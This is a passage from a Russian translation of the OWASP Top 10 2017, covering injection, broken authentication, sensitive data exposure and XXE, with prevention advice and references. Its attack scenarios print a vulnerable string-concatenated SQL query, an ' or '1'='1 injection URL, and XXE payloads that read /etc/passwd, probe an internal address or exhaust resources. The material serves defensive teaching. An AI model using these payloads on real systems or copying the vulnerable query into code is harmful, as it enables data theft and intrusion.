<td>Небезопасная десериализация часто приводит к удаленному выполнению кода. Ошибки десериализации, не приводящие к удаленному выполнению кода, могут быть использованы для атак с повторным воспроизведением, внедрением и повышением привилегий.</td>
</tr>
<tr class="odd">
<td><strong>A9:2017-Использование компонентов с известными уязвимостями</strong></td>
<td>Компоненты, такие как библиотеки, фреймворки и программные модули, запускаются с привилегиями приложения. Эксплуатация уязвимого компонента может привести к потере данных или перехвату контроля над сервером. Использование приложениями и API компонентов с известными уязвимостями может нарушить защиту приложения и привести к серьезным последствиям.</td>
</tr>
<tr class="even">
<td><strong>A10:2017-Недостатки журналирования и мониторинга</strong></td>
<td>Недостатки журналирования и мониторинга, а также отсутствие или неэффективное использование системы реагирования на инциденты, позволяют злоумышленникам развить атаку, скрыть свое присутствие и проникнуть в другие системы, а также изменить, извлечь или уничтожить данные. Проникновение в систему обычно обнаруживают только через 200 дней и, как правило, сторонние исследователи, а не в рамках внутренних проверок или мониторинга.</td>
</tr>
</tbody>
</table>
<h1 id="a12017-внедрение">A1:2017 Внедрение</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 3</td>
<td>Распространенность 2 : Сложность обнаружения 3</td>
<td>Технические 3 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Почти любой источник данных может оказаться вектором для внедрения: переменные окружения, параметры, внешние и внутренние веб-службы, а также все типы пользователей. <a href="https://owasp.org/www-community/Injection_Flaws">Внедрения</a> становятся возможными, если злоумышленник может отправлять интерпретатору вредоносные данные.</td>
<td>Внедрения особенно распространены в старом коде. Уязвимости часто встречаются в SQL-, LDAP-, XPath- или NoSQL-запросах, системных командах, XML-обработчиках, SMTP-заголовках, языках выражений и ORM-запросах. Внедрения легко обнаружить при анализе кода. Сканеры и фаззеры могут помочь злоумышленникам найти подобные уязвимости.</td>
<td>Внедрения могут привести к потере данных, их повреждению или разглашению третьим лицам, а также к отказу в обслуживании. В некоторых случаях контроль над узлом может быть полностью перехвачен. Последствия для бизнеса зависят от статуса приложения и данных.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым">Является ли приложение уязвимым?</h2>
<p>Приложение уязвимо, если:</p>
<ul>
<li>вводимые пользователем данные не проверяются, не фильтруются или не очищаются;</li>
<li>динамические запросы или непараметризованные вызовы без контекстного экранирования напрямую используются в интерпретаторе;</li>
<li>вредоносные данные используются в поисковых параметрах объектно-реляционного отображения для извлечения дополнительной или критически важной информации;</li>
<li>вредоносные данные используются или добавляются т.о., что SQL-код или команды содержат структурные и вредоносные данные в динамических запросах, командах или хранимых процедурах.</li>
</ul>
<p>Наиболее распространенными являются SQL-, NoSQL-, ORM-, LDAP-, EL- или OGNL-внедрения, а также внедрения команд ОС. То же самое касается всех интерпретаторов. Анализ исходного кода является лучшим способом обнаружения внедрений, за которым следует полное автоматизированное тестирование всех вводимых параметров, заголовков, URL, куки, JSON-, SOAP- и XML-данных. Организации также могут включать в процесс непрерывной интеграции и развертывания ПО (CI/CD) статическое (<a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a>) и динамическое (<a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a>) тестирование кода и приложений для обнаружения новых уязвимостей перед внедрением приложений в производство.</p>
<h3 id="orm--ldap--el--ognl">ORM | LDAP | EL | OGNL</h3>
<ul>
<li><strong>ORM</strong> - Объектно-реляционное отображение</li>
<li><strong>LDAP</strong> - Облегченный протокол доступа к каталогам</li>
<li><strong>EL</strong> - Язык выражений</li>
<li><strong>OGNL</strong> - Объектно-графовый язык навигации</li>
</ul>
<h2 id="как-предотвратить">Как предотвратить</h2>
<p>Для предотвращения внедрений необходимо изолировать данные от команд и запросов.</p>
<ul>
<li>Используйте безопасный API, исключающий применение интерпретатора или предоставляющий параметризованный интерфейс, либо используйте инструменты объектно-реляционного отображения (ORM). <strong>Примечание</strong>: даже параметризованные хранимые процедуры могут привести к SQL-внедрениям, если PL/SQL или T-SQL позволяют присоединять запросы и данные или выполнять вредоносный код с помощью EXECUTE IMMEDIATE или exec().</li>
<li>Реализуйте на сервере белые списки для проверки входных данных. Это, конечно, не обеспечит полную защиту, поскольку многие приложения используют спецсимволы, например, в текстовых областях или API для мобильных приложений.</li>
<li>Для остальных динамических запросов реализуйте экранирование спецсимволов, используя соответствующий интерпретатору синтаксис. <strong>Примечание</strong>: элементы SQL-структуры, такие как названия таблиц или столбцов, нельзя экранировать, поэтому предоставляемые пользователями названия представляют опасность. Это обычная проблема программ для составления отчетов.</li>
<li>Используйте в запросах LIMIT или другие элементы управления SQL для предотвращения утечек данных.</li>
</ul>
<h2 id="примеры-сценариев-атак">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: Приложение использует недоверенные данные при создании следующего уязвимого SQL-вызова:</p>
<p><code>String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";</code></p>
<p><strong>Сценарий №2</strong>: Безоговорочное доверие приложений к фреймворкам может привести к появлению уязвимых запросов (например, в языке запросов HQL):</p>
<p><code>Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");</code></p>
<p>В обоих случаях злоумышленник изменяет в своем браузере значение параметра "id" для отправки ' or '1'='1. Например:</p>
<p><code>https://example.com/app/accountView?id=' or '1'='1</code></p>
<p>Изменение обоих запросов позволяет получить все записи из таблицы учетных данных. Более серьезные атаки позволяют изменить или удалить данные, а также вызвать хранимые процедуры.</p>
<h2 id="ссылки-1">Ссылки</h2>
<h3 id="owasp-1">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c3-secure-database">Проактивная защита OWASP: Параметризация запросов</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md">Стандарт подтверждения безопасности приложений OWASP (ASVS): V5 Проверка входных данных и кодировки</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">Руководство OWASP по тестированию: Внедрение SQL-кода</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">команд</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection">ORM</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html">Памятка OWASP: Предотвращение внедрений</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">Памятка OWASP: Предотвращение SQL-внедрений</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html_in_Java">Памятка OWASP: Предотвращение внедрений в Java</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">Памятка OWASP: Параметризация запросов</a></li>
<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">Справочник OWASP по автоматизированным атакам на веб-приложения – OAT-014</a></li>
</ul>
<h3 id="сторонние-1">Сторонние</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Внедрение команд</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Внедрение SQL</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/564.html">CWE-564: Внедрение SQL-кода с использованием Hibernate</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917: Внедрение кода языка выражений</a></li>
<li><a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger: Внедрение в серверные шаблоны</a></li>
</ul>
<h1 id="a22017-недостатки-аутентификации">A2:2017 Недостатки аутентификации</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 3</td>
<td>Распространенность 2 : Сложность обнаружения 2</td>
<td>Технические 3 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Злоумышленники имеют доступ к сотням тысяч действительных комбинаций имен и паролей для атак на учетные записи, спискам стандартных учетных данных администраторов, инструментам для автоматизации атак методом подбора и атак по словарям. Атаки на сессии хорошо изучены, особенно в части действующих токенов сессий.</td>
<td>Недостатки аутентификации очень распространены из-за исполнения и реализации большинства средств идентификации и контроля доступа. Управление сессиями является основой аутентификации и контроля доступа и присутствует во всех приложениях с контролем состояния. Атакующие могут обнаружить недостатки аутентификации вручную и эксплуатировать их, используя автоматизированные инструменты, списки паролей и атаки по словарю. </td>
<td>Для компрометации системы злоумышленнику достаточно получить доступ к нескольким обычным или одной администраторской учетной записи. В зависимости от области использования приложения результатом может стать отмывание денег, мошенничество в сфере социального обеспечения или кража персональных данных, а также разглашение охраняемой законом, конфиденциальной информации.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-1">Является ли приложение уязвимым?</h2>
<p>Подтверждение личности пользователя, аутентификация и управление сессиями играют важную роль в защите от атак, связанных с аутентификацией.</p>
<p>Приложение имеет недостатки в аутентификации, если:</p>
<ul>
<li>допускается проведение автоматизированных атак, например, <a href="https://owasp.org/www-community/attacks/Credential_stuffing">на учетные записи</a>, когда у атакующего есть список действующих имен и паролей пользователей;</li>
<li>допускается проведение атак методом подбора или других автоматизированных атак;</li>
<li>допускается использование стандартных, ненадежных или хорошо известных паролей, например "Password1" или "admin/admin“;</li>
<li>используются ненадежные или неэффективные методы восстановления учетных данных и паролей, например "ответы на основе знаний", которые являются небезопасными;</li>
<li>используются незашифрованные, зашифрованные или ненадежно хешированные пароли (см. <a href="0xa3-sensitive-data-disclosure.md">A3: 2017-Разглашение конфиденциальных данных</a>);</li>
<li>отсутствует или является неэффективной многофакторная аутентификация;</li>
<li>отображаются идентификаторы сессии в URL (например, перезапись URL);</li>
<li>не меняются идентификаторы сессий после успешного входа в систему;</li>
<li>некорректно аннулируются идентификаторы сессий. Пользовательские сессии или токены аутентификации (в частности, токены единого входа (SSO)) неправильно аннулируются при выходе из системы или бездействии.</li>
</ul>
<h2 id="как-предотвратить-1">Как предотвратить</h2>
<ul>
<li>Где это возможно, реализуйте многофакторную аутентификацию для предотвращения автоматизированных атак, атак на учетные записи и методом подбора, а также повторного использования украденных учетных данных.</li>
<li>Не используйте создаваемые по умолчанию (стандартные) учетные данные, особенно для администраторов.</li>
<li>Реализуйте проверку надежности паролей, например проверяя вновь создаваемые или изменяемые пароли по списку <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">"10000 наихудших паролей"</a>.</li>
<li>Установите длину, сложность и периодичность смены паролей в соответствии с <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">руководством NIST 800-63 B (раздел 5.1.1 "Запоминаемые секреты")</a> или любой другой современной парольной политикой.</li>
<li>Обеспечьте защиту регистрации, восстановления учетных данных и API от атак методом перечисления, используя во всех ответах одинаковые сообщения.</li>
<li>Ограничьте или значительно увеличьте интервал между неудачными попытками входа. Регистрируйте все неудачные попытки и уведомляйте администраторов при обнаружении атак на учетные данные, методом подбора или любых других атак.</li>
<li>Используйте менеджеры сессий на стороне сервера, надежные, встроенные, генерирующие после входа в систему новые, случайные идентификаторы с высокой степенью энтропии. Идентификаторы сессий не должны присутствовать в URL, а должны безопасно храниться и аннулироваться после выхода из системы, простоя или наступления абсолютного тайм-аута.</li>
</ul>
<h2 id="примеры-сценариев-атак-1">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: <a href="https://owasp.org/www-community/attacks/Credential_stuffing">Атака на учетные записи</a>, с использованием <a href="https://github.com/danielmiessler/SecLists">списков известных паролей</a>, является очень распространенной. Если в приложении нет защиты от автоматизированных атак или атак на учетные записи, то оно может быть использовано для определения действующих учетных данных.</p>
<p><strong>Сценарий №2</strong>: Большинство атак на аутентификацию связано с использованием исключительно паролей. Ранее считавшиеся хорошими требования к смене пароля и его сложности способствуют использованию и переиспользованию пользователями ненадежных паролей. Организациям рекомендуется отказаться от подобной практики (см. NIST 800-63) и внедрить многофакторную аутентификацию.</p>
<p><strong>Сценарий №3</strong>: Тайм-ауты сессий настроены некорректно. Люди используют общедоступные компьютеры для доступа к приложению, а вместо "выхода из приложения" просто закрывают вкладку и уходят. Злоумышленник может открыть тот же самый браузер спустя час и воспользоваться все еще действующей аутентификацией пользователя.</p>
<h2 id="ссылки-2">Ссылки</h2>
<h3 id="owasp-2">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c6-digital-identity">Проактивная защита OWASP: реализация защиты идентификационных данных и аутентификации</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">Стандарт подтверждения безопасности приложений OWASP (ASVS): V2 Аутентификация</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">Стандарт подтверждения безопасности приложений OWASP (ASVS): V3 Управление сессиями</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README">Руководство OWASP по тестированию: Идентификационные данные</a> и <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README">Аутентификация</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">Памятка OWASP: Аутентификация</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html">Памятка OWASP: Утечка учётных данных</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html">Памятка OWASP: Забытый пароль</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">Памятка OWASP: Управление сессиями</a></li>
<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">Справочник OWASP по автоматизированным атакам</a></li>
</ul>
<h3 id="сторонние-2">Сторонние</h3>
<ul>
<li><a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63b: 5.1.1 Запоминаемые секреты</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Некорректная аутентификация</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Фиксация сессии</a></li>
</ul>
<h1 id="a32017-разглашение-конфиденциальных-данных">A3:2017 Разглашение конфиденциальных данных</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 2</td>
<td>Распространенность 3 : Сложность обнаружения 2</td>
<td>Технические 3 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Вместо взлома механизмов шифрования злоумышленники крадут ключи, проводят атаки по принципу "человек посередине" или получают данные в незашифрованном виде с сервера, в процессе их передачи или из клиента пользователя, например браузера. Подобные атаки обычно проводятся вручную. Ранее полученные базы данных паролей могут быть взломаны методом подбора с использованием графических процессоров.</td>
<td>На протяжении последних лет данная атака является самой распространенной и опасной. Чаще всего встречается отсутствие шифрования конфиденциальных данных, а при наличии часто используются ненадежные алгоритмы, протоколы, шифры, методы хранения хешированных паролей или методы создания и управления ключами. Также легко обнаружить уязвимости на стороне сервера для передаваемых данных, но не хранимых.</td>
<td>Из-за уязвимости часто страдают все персональные данные (медицинские записи, учетные данные, данные кредитных карт), которые должны быть защищены по закону, например в соответствии с Общим регламентом ЕС по защите данных (GDPR) или локальными законами о неприкосновенности данных.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-2">Является ли приложение уязвимым?</h2>
<p>Прежде всего необходимо определить требуемый уровень защиты данных при их передаче и хранении. Например, пароли, номера кредитных карт, медицинские записи, персональные данные и коммерческие тайны требуют дополнительной защиты, особенно если они подпадают под действие закона о неприкосновенности данных (напр., Общего регламента ЕС по защите данных (GDPR)) или закона о защите финансовых данных (напр., Стандарта безопасности данных в сфере платежных карт (PCI DSS)).</p>
<ul>
<li>Шифруются ли передаваемые данные? Это касается протоколов передачи данных, таких как HTTP, SMTP и FTP. Особенно опасен внешний интернет-трафик. Проверьте весь внутренний трафик, например между балансировщиками нагрузки, веб-серверами и внутренними системами.</li>
<li>Шифруются ли хранилища важных данных, а также резервные копии?</li>
<li>Используются ли по умолчанию или в более ранних версиях устаревшие или ненадежные алгоритмы шифрования?</li>
<li>Используются ли созданные по умолчанию, ненадежные или одинаковые шифроключи, а также применяются ли соответствующие механизмы контроля и смены ключей?</li>
<li>Используется ли шифрование, например присутствуют ли директивы безопасности пользовательских агентов (браузеров) и заголовки?</li>
<li>Проверяет ли пользовательский агент (напр., приложение или почтовый клиент) действительность полученных сертификатов?</li>
</ul>
<p>См. Стандарт подтверждения безопасности приложений: <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x14-V6-Cryptography.md">Криптография (V7)</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x16-V8-Data-Protection.md">Защита данных (V9)</a> и <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x17-V9-Communications.md">SSL/TLS (V9)</a>.</p>
<h2 id="как-предотвратить-2">Как предотвратить?</h2>
<p>Выполните как минимум следующее, а также ознакомьтесь с материалами в разделе "Ссылки":</p>
<ul>
<li>Классифицируйте данные, обрабатываемые, хранимые или передаваемые приложением. Определите, какие из них являются конфиденциальными согласно законам о неприкосновенности данных, нормативам или бизнес-требованиям.</li>
<li>Реализуйте требования согласно классификации.</li>
<li>Не храните конфиденциальные данные без необходимости. Сразу удаляйте их или используйте токенизацию или усечение, соответствующие стандарту PCI DSS. Данные, которые не сохраняются, нельзя украсть.</li>
<li>Обеспечьте шифрование всех хранимых конфиденциальных данных.</li>
<li>Обеспечьте применение современных и надежных алгоритмов, протоколов и ключей, а также используйте соответствующие механизмы управления ключами.</li>
<li>Шифруйте все передаваемые данные с помощью надежного протокола, например TLS с совершенной прямой секретностью (PFS), приоритизацией шифров сервером и безопасными настройками. Обеспечьте принудительное шифрование, например используя механизм принудительного использования HTTPS (HSTS).</li>
<li>Отключите кэширование ответов, содержащих конфиденциальные данные.</li>
<li>Сохраняйте пароли с помощью надежных, адаптивных функций хеширования с солью и фактором трудоемкости (задержки), таких как <a href="https://github.com/p-h-c/phc-winner-argon2">Argon2</a>, <a href="https://wikipedia.org/wiki/Scrypt">scrypt</a>, <a href="https://wikipedia.org/wiki/Bcrypt">bcrypt</a> или <a href="https://wikipedia.org/wiki/PBKDF2">PBKDF2</a>.</li>
<li>Проверяйте отдельно эффективность конфигурации и настройки.</li>
</ul>
<h2 id="примеры-сценариев-атак-2">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: Приложение шифрует номера кредитных карт в базе данных, используя автоматическое шифрование БД. Однако эти данные автоматически расшифровываются при извлечении, позволяя с помощью внедрения SQL-кода получить данные кредитных карт в незашифрованном виде.</p>
<p><strong>Сценарий №2</strong>: Сайт не использует TLS для всех страниц или поддерживает ненадежное шифрование. Злоумышленник может просмотреть сетевой трафик (например, в небезопасной беспроводной сети), переключить соединение с HTTPS на HTTP, перехватить запросы и похитить сессионные куки. После этого он может использовать полученные куки для перехвата сессии пользователя (прошедшего аутентификацию), изменив личные данные пользователя. Также злоумышленник может изменить все передаваемые данные, например получателя денежного перевода.</p>
<p><strong>Сценарий №3</strong>: Для сохранения паролей в базе данных не используется соль или используется простой алгоритм хеширования. Уязвимость в загрузке файлов позволяет злоумышленнику получить БД паролей. Все хеш-значения без соли могут быть восстановлены с помощью радужной таблицы предварительно расчитанных хешей. Хеш-значения, рассчитанные с использованием простых или быстрых хеш-функций, могут быть взломаны с помощью графических процессоров, даже если для них использовалась соль.</p>
<h2 id="ссылки-3">Ссылки</h2>
<h3 id="owasp-3">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c8-protect-data-everywhere">Проактивная защита OWASP: Защита данных</a></li>
<li><a href="https://owasp.org/www-project-application-security-verification-standard/">Стандарт подтверждения безопасности приложений OWASP</a>: <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x14-V6-Cryptography.md">V6</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x16-V8-Data-Protection.md">9</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x17-V9-Communications.md">10</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">Памятка OWASP: Защита транспортного уровня</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/User_Privacy_Protection_Cheat_Sheet.html">Памятка OWASP: Защита конфиденциальности пользователей</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Памятка OWASP: Хранение паролей</a> и <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html">хранение в зашифрованном виде</a></li>
<li><a href="https://owasp.org/www-project-secure-headers/">Проект OWASP: Безопасные заголовки</a>; <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html">Памятка по HSTS</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README">Руководство OWASP по тестированию: Проверка надежности шифрования</a></li>
</ul>
<h3 id="сторонние-3">Сторонние</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/202.html">CWE-202: Разглашение конфиденциальных данных, связанное с запросами</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/310.html">CWE-310: Уязвимости, связанные с криптографией</a>; <a href="https://cwe.mitre.org/data/definitions/311.html">CWE-311: Отсутствие шифрования</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312: Хранение критичных данных в незашифрованном виде</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Передача критичных данных в незашифрованном виде</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Ненадежное шифрование</a>; <a href="https://cwe.mitre.org/data/definitions/327.html">CWE-327: Скомпрометированный криптоалгоритм</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/359.html">CWE-359: Разглашение личных данных (Нарушение конфиденциальности)</a></li>
</ul>
<h1 id="a42017-внешние-сущности-xml-xxe">A4:2017 Внешние сущности XML (XXE)</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 2</td>
<td>Распространенность 2 : Сложность обнаружения 3</td>
<td>Технические 3 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Злоумышленники могут эксплуатировать уязвимые обработчики XML через загрузку XML или внедрение вредоносного контента в XML-документы, используя уязвимый код, зависимости или компоненты.</td>
<td>По умолчанию большинство старых обработчиков XML позволяют задавать внешние сущности, URI, которые разыменовываются и вычисляются при обработке XML. Инструменты <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> позволяют обнаружить уязвимость путем проверки зависимостей и конфигурации. Инструменты <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> требуют дополнительных операций, выполняемых вручную, для обнаружения и эксплуатации уязвимости. Тестировщиков, выполняющих проверки вручную, необходимо обучать XXE-тестированию, поскольку подобные проверки обычно (по состоянию на 2017 г.) не проводятся.</td>
<td>Подобные уязвимости могут использоваться для получения данных, выполнения удаленных запросов с сервера, сканирования внутренней системы, провоцирования отказа в обслуживании, а также осуществления других атак. Последствия для бизнеса зависят от требований к защите уязвимых приложений и данных.</td>
</tr>
</tbody>
</table>
<p>|</p>
<h2 id="является-ли-приложение-уязвимым-3">Является ли приложение уязвимым?</h2>
<p>Приложения, в особенности веб-службы или компоненты на основе XML, являются уязвимыми в следующих случаях:</p>
<ul>
<li>приложение принимает XML напрямую или через выгрузку, особенно от недоверенных источников, или включает непроверенные данные в XML-документы, которые затем обрабатываются XML-обработчиком;</li>
<li>хотя бы один из XML-обработчиков приложения или веб-службы на основе SOAP использует <a href="https://en.wikipedia.org/wiki/Document_type_definition">определение типа документов (DTD)</a>. Поскольку механизм отключения DTD зависит от обработчика, рекомендуется воспользоваться справочной информацией, например <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">"Памяткой OWASP по предотвращению XXE"</a>;</li>
<li>приложение использует SAML для идентификации в рамках федеративной безопасности или технологии единого входа (SSO). SAML использует XML для подтверждения идентификаторов, поэтому может быть уязвим;</li>
<li>приложение использует SOAP версии ниже 1.2. Оно может быть уязвимо для XXE-атак, если XML-сущности передаются фреймворку SOAP;</li>
<li>если приложение уязвимо для XXE-атак, то злоумышленник может также вызвать отказ в обслуживании или осуществить атаку с использованием миллиона XML-сущностей (Billion Laughs).</li>
</ul>
<h2 id="как-предотвратить-3">Как предотвратить</h2>
<p>Обучение разработчиков имеет большое значение для выявления и противодействия XXE. Кроме того, для предотвращения XXE необходимо:</p>
<ul>
<li>использовать по возможности более простые форматы данных, например JSON, и избегать сериализации критически важных данных;</li>
<li>установить исправления или обновления для всех библиотек и обработчиков XML, используемых приложением или ОС. Использовать проверки зависимостей. Обновить SOAP до версии 1.2 или выше;</li>
<li>отключить обработку внешних сущностей XML и DTD во всех XML-обработчиках приложения, согласно <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">"Памятке OWASP по предотвращению XXE"</a>;</li>
<li>реализовать на сервере (по белым спискам) проверку, фильтрацию или очистку (экранирование) входных данных для предотвращения попадания вредоносных данных в XML-документы, заголовки или узлы;</li>
<li>удостовериться, что функция загрузки XML или XSL проверяет входящие файлы с использованием XSD или другой подобной методики;</li>
<li>анализировать код масштабных и сложных приложений со множеством встраиваемых компонентов вручную, хотя инструменты SAST могут помочь обнаружить XXE в исходном коде.</li>
</ul>
<p>Если выполнение данных требований невозможно, попробуйте использовать виртуальные патчи, шлюзы безопасности API или файрволы веб-приложений (WAF) для обнаружения, мониторинга и блокировки XXE-атак.</p>
<h2 id="примеры-сценариев-атак-3">Примеры сценариев атак</h2>
<p>Было зафиксировано большое количество XXE-атак, включая атаки на встроенные устройства. XXE обнаруживаются в самых неожиданных местах, включая глубоко вложенные зависимости. Самым простым способом реализации атаки является загрузка (если поддерживается) вредоносного XML-файла:</p>
<p><strong>Сценарий №1</strong>: Злоумышленник пытается получить данные с сервера:</p>
<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
    &lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
<p><strong>Сценарий №2</strong>: Злоумышленник исследует внутреннюю сеть сервера, заменяя вышеуказанную строку ENTITY на:</p>
<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;</code></pre>
<p><strong>Сценарий №3</strong>: Злоумышленник пытается вызвать отказ в обслуживании, используя потенциально бесконечный файл:</p>
<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code></pre>
<h2 id="ссылки-4">Ссылки</h2>
<h3 id="owasp-4">OWASP</h3>
<ul>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">Стандарт подтверждения безопасности приложений OWASP</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection">Руководство OWASP по тестированию: Проверка внедрения XML</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">OWASP: Уязвимость XXE</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">Памятка OWASP: Предотвращение XXE</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">Памятка OWASP: Безопасность XML</a></li>
</ul>
<h3 id="сторонние-4">Сторонние</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611: Некорректное ограничение ссылок на внешние сущности XML</a></li>
<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Атака Billion Laughs (с использованием миллиона XML-сущностей)</a></li>
<li><a href="https://secretsofappsecurity.blogspot.tw/2017/01/saml-security-xml-external-entity-attack.html">Атака на SAML с использованием внешних сущностей XML</a></li>
<li><a href="https://web-in-security.blogspot.tw/2014/11/detecting-and-exploiting-xxe-in-saml.html">Обнаружение и эксплуатация XXE в SAML-интерфейсах</a></li>
</ul>
<h1 id="a52017-недостатки-контроля-доступа">A5:2017 Недостатки контроля доступа</h1>
<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
